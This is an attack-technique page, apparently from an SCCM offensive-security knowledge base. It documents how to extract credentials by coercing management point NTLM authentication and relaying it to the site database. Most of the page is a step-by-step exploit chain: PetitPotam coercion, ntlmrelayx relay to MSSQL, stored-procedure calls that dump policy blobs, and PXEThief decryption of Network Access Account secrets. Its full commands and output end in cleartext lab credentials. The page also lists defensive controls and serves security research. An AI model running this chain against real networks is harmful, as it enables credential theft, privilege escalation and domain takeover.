# CRED-8

## Description
Extract credentials from SCCM policies by coercing and relaying management point (MP) NTLM authentication to the site database.

## MITRE ATT&CK TTPs
- [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation
- [TA0006](https://attack.mitre.org/tactics/TA0006/) - Credential Access
- [T1555](https://attack.mitre.org/techniques/T1555/) - Passwords from Password Stores
- [T1187](https://attack.mitre.org/techniques/T1187/) - Forced Authentication

## Requirements
The site database and MP are not hosted on the same host.

### Coercion
- Valid Active Directory domain credentials
- Connectivity to SMB (TCP/445) on MP
- Connectivity from the coercion target to SMB (TCP/445) on the relay server
- Coercion target settings:
    - `BlockNTLM` = `0` or not present, or = `1` and `BlockNTLMServerExceptionList` contains attacker relay server [DEFAULT]
    - `RestrictSendingNTLMTraffic` = `0`, `1`, or not present, or = `2` and `ClientAllowedNTLMServers` contains attacker relay server [DEFAULT]
    - Domain computer account is not in `Protected Users` [DEFAULT]
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains coercion target [DEFAULT]

### Relay
- Connectivity from the relay server to MSSQL (TCP/1433) on the relay target, the site database
- Extended protection for authentication not required on the site database [DEFAULT]
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains relay target [DEFAULT]
    - `LmCompatibilityLevel` < `5` or not present, or = `5` and LmCompatibilityLevel >= `3` on the coercion target [DEFAULT]

## Summary
Management point computer accounts are granted the `smsdbrole_MP` database role on the site database, which provides EXEC permissions on various stored procedures (SPs). One of these SPs is `MP_GetPolicyBody`, which returns a hex-encoded blob containing the body of the policy. Then, the policy can be decoded, revealing the cleartext policy which contains encrypted credential blobs. Lastly, the credential blob can be decrypted using PXEThief, leading to the extraction of any and all credentials configured in OSD, including task sequence variables.

## Impact
In environments using Active Directory defaults, SCCM defaults, and any SCCM credentials distributed via machine policy (e.g., NAA,  collection variables, task sequence variables, RunAs accounts, OSD domain join accounts), any domain-authenticated user may coerce authentication from the remote management point, relay it to the site database, execute the SP to dump the policy body, then decrypt the credential material.

If any of these credentials are privileged, as they often unncessarily are, this could lead to vertical privilege escalation, SCCM hierarchy takeover, or domain dominance. At the very least, it would lead to horizontal privilege escalation.


## Defensive IDs
- [PREVENT-10: Enforce the principle of least privilege for accounts](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/defense-techniques/PREVENT/PREVENT-10/prevent-10_description.md)
- [PREVENT-12: Require SMB signing on site systems](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/defense-techniques/PREVENT/PREVENT-12/prevent-12_description.md)
- [PREVENT-14: Configure Extended Protection for Authentication](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/defense-techniques/PREVENT/PREVENT-14/prevent-14_description.md)
- [DETECT-1: Monitor site server domain computer accounts authenticating from another source](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/defense-techniques/DETECT/DETECT-1/detect-1_description.md)



## Examples
1. Setup `ntlmrelayx.py` to target the site database and establish a SOCKS session in the context of the relayed account
```
ntlmrelayx.py -ts -t mssql://10.3.10.13 -socks -smb2support
```

2. Coerce a management point to the relay server
```
┌──(impacket)─(root㉿sccm-kali)-[~/PetitPotam]
└─# python3 PetitPotam.py 10.3.10.20 10.3.10.14 -u domainuser -p password -d ludus.domain -dc-ip 10.3.10.10
<SNIPPED>
Trying pipe lsarpc
[-] Connecting to ncacn_np:10.3.10.14[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!

-------------------------------------------------------------------------------------

└─# ntlmrelayx.py -ts -t mssql://10.3.10.13 -socks -smb2support
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

<SNIPPED>

[2025-07-07 01:02:51] [*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx> [2025-07-07 01:02:54] [*] SMBD-Thread-9 (process_request_thread): Received connection from 10.3.10.14, attacking target mssql://10.3.10.13
[2025-07-07 01:02:54] [*] Authenticating against mssql://10.3.10.13 as LUDUS/SCCM-MGMT$ SUCCEED
[2025-07-07 01:02:54] [*] SOCKS: Adding LUDUS/SCCM-MGMT$@10.3.10.13(1433) to active SOCKS connection. Enjoy
[2025-07-07 01:02:54] [*] All targets processed!
[2025-07-07 01:02:54] [*] SMBD-Thread-10 (process_request_thread): Connection from 10.3.10.14 controlled, but there are no more targets left!
socks
Protocol  Target      Username          AdminStatus  Port
--------  ----------  ----------------  -----------  ----
MSSQL     10.3.10.13  LUDUS/SCCM-MGMT$  N/A          1433
ntlmrelayx>
```

3. Retrieve the `x64UnknownMachineGUID` GUID by running a `SELECT` statement in the open SOCKS session

```
┌──(PXEThief)─(root㉿sccm-kali)-[~/PetitPotam]
└─# proxychains mssqlclient.py LUDUS/SCCM-MGMT\$@10.3.10.13 -windows-auth
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Password:
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.3.10.13:1433  ...  OK
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(sccm-sql): Line 1: Changed database context to 'master'.
[*] INFO(sccm-sql): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
[!] Press help for extra shell commands
SQL (ludus\SCCM-MGMT$  guest@master)> use CM_123
ENVCHANGE(DATABASE): Old Value: master, New Value: CM_123
INFO(sccm-sql): Line 1: Changed database context to 'CM_123'.
SQL (ludus\SCCM-MGMT$  ludus\SCCM-MGMT$@CM_123)> select * from dbo.UnknownSystem_DISC
   ItemKey   DiscArchKey   SMS_Unique_Identifier0                 Name0                                         Description0           CPUType0   Creation_Date0        SiteCode0   Decommissioned0
----------   -----------   ------------------------------------   -------------------------------------------   --------------------   --------   -------------------   ---------   ---------------
2046820352             2   10993e21-6145-4cb4-a9cb-86c95721cd93   x86 Unknown Computer (x86 Unknown Computer)   x86 Unknown Computer   x86        2025-06-04 16:15:07   123                       0

2046820353             2   e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7   x64 Unknown Computer (x64 Unknown Computer)   x64 Unknown Computer   x64        2025-06-04 16:15:07   123                       0
```

4. Run the `MP_GetMachinePolicyAssignments` SP using the recovered GUID, teeing the results to a file
```
└─# proxychains mssqlclient.py LUDUS/SCCM-MGMT\$@10.3.10.13 -debug  -windows-auth -db CM_123 -command "exec MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N''" |tee assignments.txt
Impacket v0.13.0.dev0+20250702.182415.b33e994d - Copyright Fortra, LLC and its affiliated companies

[+] Impacket Library Installation Path: /root/impacket/lib/python3.13/site-packages/impacket
Password:
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.3.10.13:1433  ...  OK
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(sccm-sql): Line 1: Changed database context to 'master'.
[*] INFO(sccm-sql): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
SQL> exec MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N''
PolicyAssignmentID                       Version   LastUpdateTime                  Body   IsTombstoned   BodySignature                                                                                                                                                                                                                                                     HashAlgId   HashAlgOID              InProcess   SiteMaintenance   ClientStatus
--------------------------------------   -------   -----------------------   ----------   ------------   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   ---------   ---------------------   ---------   ---------------   ------------
{cc2020c2-ff76-4f5c-a226-c76bf22121eb}   1.00      2025-07-04 14:33:34.250   b'fffe3c0050006f006c00690063007900410073007300690067006e006d0065006e007400200050006f006c00690063007900410073007300690067006e006d0065006e007400490044003d0022007b00630063003200300032003000630032002d0066006600370036002d0034006600350063002d0061003200320036002d006300370036006200660032003200310032003100650062007d0022003e000d000a003c0043006f006e0064006900740069006f006e003e003c004f00700065007200610074006f00720020004f00700065007200610074006f00720054007900700065003d00220041004e00440022003e003c00450078007000720065007300730069006f006e002000450078007000720065007300730069006f006e0054007900700065003d00220063006f006e00740069006e0075006f007500730022002000450078007000720065007300730069006f006e004c0061006e00670075006100670065003d002200570051004c0022003e00530045004c0045004300540020002a002000460052004f004d002000570069006e00330032005f004f007000650072006100740069006e006700530079007300740065006d0020005700480045005200450020004f00530054007900700065003d00310038003c002f00450078007000720065007300730069006f006e003e003c00450078007000720065007300730069006f006e002000450078007000720065007300730069006f006e0054007900700065003d00220075006e00740069006c002d00740072007500650022002000450078007000720065007300730069006f006e004c0061006e00670075006100670065003d002200570051004c0022003e003c0021005b00430044004100540041005b00400072006f006f0074005c00630063006d000d0 <SNIPPED>
```

5. Run the `MP_GetPolicyBody` SP using the `PolicyID` and `PolicyVersion` values as parameters
```
──(impacket)─(root㉿sccm-kali)-[~/impacket]
└─# proxychains mssqlclient.py LUDUS/SCCM-MGMT\$@10.3.10.13 -debug  -windows-auth -db CM_123 -command "exec MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00'" |tee NAAConfig.txt
Impacket v0.13.0.dev0+20250702.182415.b33e994d - Copyright Fortra, LLC and its affiliated companies

[+] Impacket Library Installation Path: /root/impacket/lib/python3.13/site-packages/impacket
Password:
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.3.10.13:1433  ...  OK
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(sccm-sql): Line 1: Changed database context to 'master'.
[*] INFO(sccm-sql): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
SQL> exec MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00'
      Body   BodyLen   PolicyFlags
----------   -------   -----------
b'fffe3c003f0078006d006c002000760065007200730069006f006e003d00220031002e003000220020003f003e000d000a003c0050006f006c00690063007900200050006f006c0069006300790054007900700065003d0022004d0061006300680069006e0065002200200053006300680065006d006100560065007200730069006f006e003d00220031002e00300030002200200050006f006c00690063007900490044003d0022007b00300038003300610066006400370061002d0062003000620065002d0034003700350036002d0061003400630065002d006300330031003800320035003000350030003300320035007d002200200050006f006c0069 <SNIPPED>
```

6. Decode policy body hex blob
```
──(impacket)─(root㉿sccm-kali)-[~/impacket]
└─# echo -   -n '3c003f0078006d00<SNIPPED>006f006c006900630079003e000d000a00' |xxd -r -p
<?xml version="1.0" ?>
<Policy PolicyType="Machine" SchemaVersion="1.00" PolicyID="{083afd7a-b0be-4756-a4ce-c31825050325}" PolicyVersion="2.00" PolicySource="SMS:123">
<PolicyRule PolicyRuleID="{ee0b1adc-44d3-4788-863b-146119cdd324}">
<Condition>
<Expression ExpressionLanguage="WQL" ExpressionType="until-true">
<![CDATA[@root\ccm
SELECT * FROM SMS_Client WHERE ClientVersion <= "5.00.7804.0000"
]]>
</Expression>
</Condition>
<PolicyAction PolicyActionType="WMI-XML">
<instance class="CCM_NetworkAccessAccount">
	<property name="SiteSettingsKey" type="19">
		<value>
			<![CDATA[1]]>
		</value>
	</property>
	<property name="NetworkAccessUsername" type="8" secret="1">
		<value>
			<![CDATA[89130000777AA4F753DF99D0E979BDE42651182017F08660C16E58C1B5EB59A9670294E6EC8E97C66FD86EB5140000001E0000002000000003660000000000002A7C3268C73A336ADE7C343686A06A656812CE8FCB469B4D7CC5501BCF5D45EA2E0064006C00]]>
		</value>
	</property>
	<property name="NetworkAccessPassword" type="8" secret="1">
		<value>
			<![CDATA[89130000E82A5A6AE760400B20D98BBAAE2C568BC140C9D6767C6320ACC979E4D34FDD5944EBD4A3C8E913DF14000000180000002000000003660000000000003F11C8F6EBEDF7F32F2F59B02FBDA50A035ACA7C5D2330A7D7013E9F9AF86547]]>
		</value>
	</property>
	<property name="Reserved1" type="8">
		<value>

		</value>
	</property>
	<property name="Reserved2" type="8">
		<value>
		</value>
	</property>
	<property name="Reserved3" type="8">
		<value>
		</value>
	</property>
</instance>

</PolicyAction>
</PolicyRule>
```

7. Decrypt any credential blobs recovered in step 6 using PXEThief
```
┌──(PXEThief)─(root㉿sccm-kali)-[/home/kali/PXEThief]
└─# python3 pxethief.py 7 89130000777AA4F753DF99D0E979BDE42651182017F08660C16E58C1B5EB59A9670294E6EC8E97C66FD86EB5140000001E0000002000000003660000000000002A7C3268C73A336ADE7C343686A06A656812CE8FCB469B4D7CC5501BCF5D45EA2E0064006C00

 ________  ___    ___ _______  _________  ___  ___  ___  _______   ________
|\   __  \|\  \  /  /|\  ___ \|\___   ___\\  \|\  \|\  \|\  ___ \ |\  _____\
\ \  \|\  \ \  \/  / | \   __/\|___ \  \_\ \  \\\  \ \  \ \   __/|\ \  \__/
 \ \   ____\ \    / / \ \  \_|/__  \ \  \ \ \   __  \ \  \ \  \_|/_\ \   __\
  \ \  \___|/     \/   \ \  \_|\ \  \ \  \ \ \  \ \  \ \  \ \  \_|\ \ \  \_|
   \ \__\  /  /\   \    \ \_______\  \ \__\ \ \__\ \__\ \__\ \_______\ \__\
    \|__| /__/ /\ __\    \|_______|   \|__|  \|__|\|__|\|__|\|_______|\|__|
          |__|/ \|__|

[+] Decrypt stored PXE password from SCCM DP registry key Reserved1
PXE Password: ludus\sccm_naa

┌──(PXEThief)─(root㉿sccm-kali)-[/home/kali/PXEThief]
└─# python3 pxethief.py 7 89130000E82A5A6AE760400B20D98BBAAE2C568BC140C9D6767C6320ACC979E4D34FDD5944EBD4A3C8E913DF14000000180000002000000003660000000000003F11C8F6EBEDF7F32F2F59B02FBDA50A035ACA7C5D2330A7D7013E9F9AF86547
 ________  ___    ___ _______  _________  ___  ___  ___  _______   ________
|\   __  \|\  \  /  /|\  ___ \|\___   ___\\  \|\  \|\  \|\  ___ \ |\  _____\
\ \  \|\  \ \  \/  / | \   __/\|___ \  \_\ \  \\\  \ \  \ \   __/|\ \  \__/
 \ \   ____\ \    / / \ \  \_|/__  \ \  \ \ \   __  \ \  \ \  \_|/_\ \   __\
  \ \  \___|/     \/   \ \  \_|\ \  \ \  \ \ \  \ \  \ \  \ \  \_|\ \ \  \_|
   \ \__\  /  /\   \    \ \_______\  \ \__\ \ \__\ \__\ \__\ \_______\ \__\
    \|__| /__/ /\ __\    \|_______|   \|__|  \|__|\|__|\|__|\|_______|\|__|
          |__|/ \|__|

[+] Decrypt stored PXE password from SCCM DP registry key Reserved1
PXE Password: Password123
```

## References
- Garrett Foster, [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)

- Garrett Foster, [mssqlkaren](https://github.com/garrettfoster13/mssqlkaren)

- Christopher Panayi, [PXEThief](https://github.com/MWR-CyberSec/PXEThief)
